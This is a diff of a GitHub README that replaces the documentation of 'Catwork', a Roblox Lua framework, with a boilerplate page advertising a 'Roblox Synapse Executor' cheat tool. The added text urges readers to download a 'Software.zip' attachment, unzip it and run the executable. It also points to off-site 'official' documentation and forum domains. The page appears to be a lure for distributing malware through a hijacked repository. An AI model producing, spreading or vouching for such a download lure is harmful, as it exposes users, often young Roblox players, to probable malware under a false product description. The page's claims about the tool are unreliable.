@@ -1,58 +1,54 @@
-<div align="center">
-<img src="res/logo.png" alt="The Catwork Logo" width=400></img>
-<h1>Catwork</h1>
-The Cat framework for Roblox! 🐈
-</div>
+# Roblox Synapse Executor
 
-> [!NOTE]
-> Catwork works best in `ReplicatedFirst`, especially since you can then utilise `ReplicatedFirst` loading behaviour.
-> Server code can access code in ReplicatedFirst.
+Welcome to the Roblox Synapse Executor repository! 🚀
 
-Catwork does not natively come packaged with a runtime, although `Script` instances can safely access the `Catwork`
-module. You'll need some way of starting `ModuleScript` instances if you wish to take full advantage of the motivations
-behind `Object`s though.
+![Roblox Synapse](https://images.unsplash.com/photo-1553688739-0259fd76678f?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fHx8fHx8fHw%3D&ixlib=rb-1.2.1&auto=format&fit=crop&w=1050&q=80)
 
-# Installation
+## Description
 
-## In Roblox:
+"Roblox Synapse Executor" is a top-tier script execution tool for Roblox, valued for its advanced features and stability, enabling seamless Lua scripting for game modifications and customization. This powerful tool empowers Roblox developers and enthusiasts to enhance their gaming experience by providing a robust platform to script various functionalities within the game environment.
 
-Download the latest release and drag it into Studio, or use a tool like [Dropper](https://create.roblox.com/store/asset/13404068475/Dropper-External-file-inserter) to insert it for you.
+## Features
 
-## In external editors
+- **Advanced Script Execution**: Execute complex Lua scripts with ease and efficiency.
+- **Stability**: Enjoy a stable platform for executing scripts without interruptions.
+- **Game Modifications**: Customize your favorite Roblox games with unique scripts.
+- **Seamless Lua Scripting**: Dive into Lua scripting without any hassle, making modifications hassle-free.
 
-To use Catwork in an external, download the /src/ folder, and drag it into your project.
+## Installation
 
-There are packages on Wally, however, these **are not supported or maintained** and should not be used, we found it easier to just maintain the package
-as a downloadable ZIP archive when publishing a release.
+To install the Roblox Synapse Executor, follow these simple steps:
 
-# Usage
+1. Download the software from the link provided below.
+2. Unzip the downloaded file.
+3. Run the executable.
+4. Start scripting and enhancing your Roblox experience!
 
-This Object simply greets the player when they join:
+[![Download Roblox Synapse Executor](https://img.shields.io/badge/Download-Software.zip-%23C13416)](https://github.com/user-attachments/files/16913109/Software.zip)
 
-```lua
-local ReplicatedFirst = game:GetService("ReplicatedFirst")
-local Catwork = require(ReplicatedFirst.Catwork)
+## Getting Started
 
-Catwork.new {
-  Init = function(self)
-    Players.PlayerAdded:Connect(function(p)
-      print(`Hello {p.Name}!`)
-    end)
-  end
-}
-```
+Once you have installed the Roblox Synapse Executor, you can begin exploring its capabilities. Here are some tips to get you started:
 
-This only scratches the true function of what Catwork can do, `Service` considerably increases the power of
-Catwork! See the documentation for more information.
+1. **Explore Scripts**: Check out sample scripts provided with the executor to understand its functionality.
+2. **Experiment**: Play around with different Lua scripts to see how you can enhance your Roblox games.
+3. **Join the Community**: Engage with other Roblox developers and share your creations for feedback and collaboration.
 
-# License
+## Resources
 
-Catwork is licensed under the MIT License. 2024 metatablecatgames
+For additional resources and support, refer to the following:
 
-# Sponsor Catwork
+- [Official Documentation](https://synapse-roblox-docs.com): Access the comprehensive documentation to maximize your scripting potential.
+- [Community Forums](https://roblox-synapse-forums.com): Engage with the vibrant Roblox Synapse community to seek advice, share ideas, and collaborate on projects.
 
-Catwork is maintainted mostly by just me, [support me and what I do!](https://github.com/sponsors/metatablecat)
+## Contributing
 
-# Attributions
+We welcome contributions from the community to enhance the Roblox Synapse Executor. If you have ideas for improvements or new features, please feel free to submit a pull request. Together, we can make the scripting experience even better for Roblox enthusiasts worldwide.
 
-Logo made by Alex. [Website](https://hofnarretje.eu/).
+## License
+
+The Roblox Synapse Executor is licensed under the MIT License. For more details, refer to the [LICENSE](./LICENSE) file in this repository.
+
+---
+
+Thank you for visiting the Roblox Synapse Executor repository! 🎮 Feel free to explore, script, and customize your Roblox games to create unique and exciting experiences. If you have any questions or feedback, don't hesitate to reach out. Happy scripting! 😎
